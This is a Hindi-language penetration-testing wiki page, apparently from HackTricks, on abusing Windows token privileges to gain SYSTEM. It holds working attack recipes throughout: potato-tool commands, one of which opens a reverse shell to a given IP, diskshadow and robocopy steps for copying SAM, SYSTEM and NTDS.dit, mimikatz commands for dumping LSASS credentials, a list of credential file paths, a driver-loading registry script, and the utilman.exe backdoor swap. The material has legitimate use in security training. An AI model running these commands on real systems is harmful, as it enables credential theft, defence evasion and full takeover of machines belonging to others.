# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

अगर आप **Windows Access Tokens** क्या हैं नहीं जानते, तो आगे बढ़ने से पहले यह पेज पढ़ें:


{{#ref}}
access-tokens.md
{{#endref}}

**शायद आप पहले से मौजूद tokens का abuse करके privileges escalate कर सकते हैं**

### SeImpersonatePrivilege

यह privilege किसी भी process के पास होता है और यह किसी भी token की impersonation (लेकिन creation नहीं) की अनुमति देता है, बशर्ते उसका handle प्राप्त किया जा सके। एक privileged token Windows service (DCOM) से exploit को NTLM authentication करने के लिए मजबूर करके प्राप्त किया जा सकता है, और उसके बाद SYSTEM privileges के साथ process execution सक्षम हो जाती है। इस vulnerability को विभिन्न tools के साथ exploit किया जा सकता है, जैसे [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (जिसके लिए winrm disabled होना चाहिए), [SweetPotato](https://github.com/CCob/SweetPotato), और [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: Windows 10 1809+/Server 2019+ पर, उपलब्ध RPC/COM surface के आधार पर **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, या **PrintSpoofer** को prefer करें।
- अगर आपने **`LOCAL SERVICE`** या **`NETWORK SERVICE`** के रूप में चल रही किसी service को compromise किया है और `whoami /priv` में **filtered token** बिना `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` दिखता है, तो पहले account का **default privilege set** recover करें (उदाहरण के लिए **FullPowers** के साथ) और उसके बाद potato family को फिर से try करें।
- कुछ newer forks original tools से ज़्यादा operator-friendly हैं। उदाहरण के लिए, **SigmaPotato** reflection/in-memory execution और modern Windows compatibility जोड़ता है, जबकि **PrintNotifyPotato** PrintNotify COM service का abuse करता है और अक्सर तब उपयोगी होता है जब classic Spooler path disabled हो।
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

यह **SeImpersonatePrivilege** के बहुत समान है, यह एक privileged token पाने के लिए **same method** का उपयोग करेगा।\
फिर, यह privilege एक new/suspended process को **primary token assign** करने की अनुमति देता है। privileged impersonation token के साथ आप एक primary token derive कर सकते हैं (DuplicateTokenEx)।\
token के साथ, आप 'CreateProcessAsUser' का उपयोग करके एक **new process** बना सकते हैं या एक process suspended बना सकते हैं और **token set** कर सकते हैं (आमतौर पर, आप running process के primary token को modify नहीं कर सकते)।

### SeTcbPrivilege

यदि आपके पास यह token enabled है, तो आप **KERB_S4U_LOGON** का उपयोग करके किसी भी अन्य user के लिए बिना credentials जाने एक **impersonation token** प्राप्त कर सकते हैं, token में **arbitrary group** (admins) जोड़ सकते हैं, token का **integrity level** "**medium**" पर set कर सकते हैं, और इस token को **current thread** को assign कर सकते हैं (SetThreadToken)।

### SeBackupPrivilege

यह privilege system को किसी भी file पर **all read access** control grant करने के लिए मजबूर करता है (सिर्फ read operations तक सीमित)। इसका उपयोग registry से local Administrator accounts के password hashes **पढ़ने** के लिए किया जाता है, जिसके बाद "**psexec**" या "**wmiexec**" जैसे tools को hash के साथ उपयोग किया जा सकता है (Pass-the-Hash technique)। हालांकि, यह technique दो स्थितियों में fail होती है: जब Local Administrator account disabled हो, या जब कोई policy मौजूद हो जो remotely connect करने वाले Local Administrators से administrative rights हटा देती हो।\
व्यवहार में, सबसे भरोसेमंद built-in workflow आमतौर पर **VSS + `robocopy /b`** होता है: shadow copy बनाएं/ expose करें, फिर `SAM`/`SYSTEM` या `NTDS.dit` को **backup mode** में copy करें, जो file ACLs को bypass करता है।
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

**write access** की अनुमति किसी भी system file पर, file's Access Control List (ACL) की परवाह किए बिना, इस privilege द्वारा दी जाती है। यह escalation के लिए कई संभावनाएँ खोलता है, जिनमें **services को modify** करने, DLL Hijacking करने, और Image File Execution Options के जरिए **debuggers** सेट करने की क्षमता शामिल है, साथ ही कई अन्य techniques भी।

### SeCreateTokenPrivilege

SeCreateTokenPrivilege एक शक्तिशाली permission है, खासकर तब उपयोगी जब किसी user के पास tokens को impersonate करने की क्षमता हो, लेकिन SeImpersonatePrivilege के बिना भी। यह capability इस बात पर निर्भर करती है कि token को impersonate किया जा सके जो same user का प्रतिनिधित्व करता हो और जिसकी integrity level current process की integrity level से अधिक न हो।

**Key Points:**

- **SeImpersonatePrivilege के बिना Impersonation:** विशिष्ट conditions के तहत EoP के लिए SeCreateTokenPrivilege का उपयोग करके tokens को impersonate करना संभव है।
- **Token Impersonation के लिए Conditions:** सफल impersonation के लिए target token का same user से belong करना और उसकी integrity level का process की integrity level के बराबर या उससे कम होना आवश्यक है जो impersonation करने की कोशिश कर रहा है।
- **Impersonation Tokens का Creation और Modification:** Users एक impersonation token बना सकते हैं और उसमें privileged group's SID (Security Identifier) जोड़कर उसे enhance कर सकते हैं।

### SeLoadDriverPrivilege

यह privilege specific values के साथ registry entry बनाकर **device drivers को load और unload** करने की अनुमति देता है, जिनमें `ImagePath` और `Type` शामिल हैं। चूँकि `HKLM` (HKEY_LOCAL_MACHINE) में direct write access restricted है, इसलिए इसके बजाय `HKCU` (HKEY_CURRENT_USER) का उपयोग करना होगा। हालांकि, driver configuration के लिए `HKCU` को kernel द्वारा recognizable बनाने के लिए, एक specific path का पालन करना जरूरी है।

Modern offensive use usually **BYOVD** (bring your own vulnerable driver) है: एक **signed but vulnerable** kernel driver load करें और फिर उसके IOCTLs का उपयोग protections को disable करने या kernel code execution तक jump करने के लिए करें। ध्यान रखें कि recent Windows 11/Server builds पर **Microsoft vulnerable driver blocklist** और/या **HVCI/Memory Integrity** अक्सर पुराने public chains को तोड़ देते हैं, इसलिए classic `szkg64.sys`-style examples अब universally reliable नहीं हैं।

यह path है `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, जहाँ `<RID>` current user का Relative Identifier है। `HKCU` के अंदर, यह पूरा path create करना होगा, और दो values set करनी होंगी:

- `ImagePath`, जो execute किए जाने वाले binary का path है
- `Type`, जिसका value `SERVICE_KERNEL_DRIVER` (`0x00000001`) है।

**Steps to Follow:**

1. Restricted write access के कारण `HKLM` की जगह `HKCU` access करें।
2. `HKCU` के अंदर path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` create करें, जहाँ `<RID>` current user's Relative Identifier को दर्शाता है।
3. `ImagePath` को binary के execution path पर set करें।
4. `Type` को `SERVICE_KERNEL_DRIVER` (`0x00000001`) assign करें।
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
इस privilege का दुरुपयोग करने के और तरीके [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

यह **SeRestorePrivilege** के समान है। इसका primary function किसी process को **किसी object का ownership assume करने** की अनुमति देता है, जो WRITE_OWNER access rights के provision के माध्यम से explicit discretionary access की requirement को circumvent करता है। इस process में पहले writing purposes के लिए intended registry key का ownership secure करना, फिर write operations enable करने के लिए DACL को बदलना शामिल है।
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

यह privilege **debug other processes** की अनुमति देता है, जिसमें memory को read और write करना शामिल है। memory injection की विभिन्न strategies, जो अधिकांश antivirus और host intrusion prevention solutions से बच सकती हैं, इस privilege के साथ इस्तेमाल की जा सकती हैं।

Modern Windows पर, याद रखें कि `SeDebugPrivilege` आमतौर पर **non-protected SYSTEM processes** को open करने और उनके tokens को duplicate करने के लिए पर्याप्त होता है, लेकिन यह **LSASS** को touch कर पाने की **guarantee** नहीं देता। अगर **RunAsPPL / LSA Protection** enabled है, तो non-protected processes LSASS को read या inject नहीं कर सकते, भले ही `SeDebugPrivilege` present हो। ऐसे में, किसी दूसरे non-PPL SYSTEM process से token steal करें, या `procdump` काम करेगा ऐसा मानने के बजाय PPL bypass/BYOVD के साथ chain करें। `SeDebugPrivilege` + `SeImpersonatePrivilege` का full token-copy example देखने के लिए [this page](sedebug-+-seimpersonate-copy-token.md) देखें।

#### Dump memory

आप [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) को [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) से **एक process की memory capture** करने के लिए use कर सकते हैं। खास तौर पर, यह **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process पर लागू हो सकता है, जो सिस्टम में सफलतापूर्वक login करने के बाद user credentials store करने के लिए जिम्मेदार है।

फिर आप इस dump को mimikatz में load करके passwords प्राप्त कर सकते हैं:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

यदि आप `NT SYSTEM` shell पाना चाहते हैं, तो आप उपयोग कर सकते हैं:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

यह अधिकार (Perform volume maintenance tasks) raw volume device handles (e.g., \\.\C:) खोलने की अनुमति देता है, जिससे direct disk I/O किया जा सकता है जो NTFS ACLs को bypass करता है। इसके साथ आप underlying blocks को पढ़कर volume पर किसी भी file के bytes copy कर सकते हैं, जिससे sensitive material का arbitrary file read संभव हो जाता है (e.g., machine private keys in %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS)। यह खास तौर पर CA servers पर impactful होता है, जहाँ CA private key exfiltrate करने से Golden Certificate forge करके किसी भी principal की impersonate करना संभव हो जाता है।

See detailed techniques and mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**Disabled** के रूप में दिखाई देने वाले tokens को आमतौर पर enable किया जा सकता है, इसलिए आप अक्सर _Enabled_ और _Disabled_ दोनों privileges का abuse कर सकते हैं।

### सभी tokens enable करें

अगर आपके पास disabled privileges हैं, तो आप script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) का उपयोग करके सभी tokens को enable कर सकते हैं:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
या **script** को इस [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) में embedded किया गया है।

## Table

Windows tokens को define करने वाली full token privileges cheatsheet यहाँ है: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), नीचे का summary केवल privilege का उपयोग करके admin session प्राप्त करने या sensitive files पढ़ने के direct ways को list करेगा।

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | अपडेट के लिए [Aurélien Chalot](https://twitter.com/Defte_) को धन्यवाद। मैं इसे जल्द ही कुछ recipe-like तरीके से re-phrase करने की कोशिश करूँगा।                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` या dedicated SeBackup-aware copy helpers का उपयोग करके sensitive files पढ़ें।                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, और कभी-कभी `%WINDIR%\MEMORY.DMP` के लिए बहुत उपयोगी।<br><br>- `robocopy` सुविधाजनक है, लेकिन dedicated SeBackup cmdlets/APIs अक्सर locked/open files के लिए अधिक flexible होते हैं।</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` के साथ local admin rights सहित arbitrary token बनाएं।                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | non-protected process से **non-PPL** SYSTEM token को duplicate करें या memory dump करें।                                                                                                                                                                                                                                                                 | <p>यदि RunAsPPL/LSA Protection enabled है, तो LSASS dumping आमतौर पर blocked होता है।</p><p>Script यहाँ मिल सकता है: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation का उपयोग करके SYSTEM spawn करें (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>यह service accounts जैसे IIS APPPOOL, MSSQL, scheduled tasks, या किसी भी context से सबसे practical है जो पहले से ही `SeImpersonatePrivilege` रखता हो।</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. एक signed-but-vulnerable kernel driver (BYOVD) load करें<br>2. kernel R/W पाने, security tooling disable करने, या SYSTEM तक elevate करने के लिए driver के IOCTLs का उपयोग करें<br><br>वैकल्पिक रूप से, यह privilege `fltMC` builtin command से security-related drivers unload करने के लिए उपयोग किया जा सकता है, यानी `fltMC sysmondrv`</p>                     | <p>`szkg64.sys` जैसे पुराने public drivers modern Windows पर vulnerable-driver blocklist / HVCI द्वारा increasingly blocked हैं।</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege present होने के साथ PowerShell/ISE launch करें।<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) के साथ privilege enable करें।<br>3. utilman.exe का नाम utilman.old करें<br>4. cmd.exe का नाम utilman.exe करें<br>5. console lock करें और Win+U दबाएँ</p> | <p>Attack कुछ AV software द्वारा detected किया जा सकता है।</p><p>Alternative method उसी privilege का उपयोग करके "Program Files" में stored service binaries को replace करने पर निर्भर करता है</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe का नाम utilman.exe करें<br>4. console lock करें और Win+U दबाएँ</p>                                                                                                                                       | <p>Attack कुछ AV software द्वारा detected किया जा सकता है।</p><p>Alternative method उसी privilege का उपयोग करके "Program Files" में stored service binaries को replace करने पर निर्भर करता है।</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Tokens को manipulate करके local admin rights शामिल करें। SeImpersonate की आवश्यकता हो सकती है।</p><p>Verify किया जाना बाकी है।</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Windows tokens को define करने वाली इस table को देखें: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- tokens के साथ privesc के बारे में [**इस paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) को देखें।
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode file/folder ACL checks bypass करता है): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
